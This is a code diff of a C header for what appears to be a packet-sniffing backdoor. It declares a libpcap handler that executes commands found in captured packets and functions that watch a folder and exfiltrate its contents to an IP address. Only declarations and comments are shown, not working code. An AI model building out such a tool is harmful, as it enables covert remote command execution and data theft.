@@ -40,17 +40,7 @@ RETURN: none.
 
 NOTES: Call this function to ready libpcap for packet capture.
 */
-void pcap_init(const char *filter);
-/*
-FUNCTION: srv_listen
-
-PARAMS: int duplex
-
-RETURN: none.
-
-NOTES: Call this function to begin the listen loop.
-*/
-void srv_listen(int duplex);
+void pcap_start(const char *filter, int duplex);
 /*
 FUNCTION: execute
 
@@ -81,6 +71,7 @@ NOTES: This function will be called any time a matching packet is captured,
 	execute the command contained within.
 */
 void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info, const u_char *packet);
-void exfil_start(uint32 ipaddr);
+void exfil_watch(uint32 ipaddr, char *folder);
+void notify(char *folder);
 
 #endif
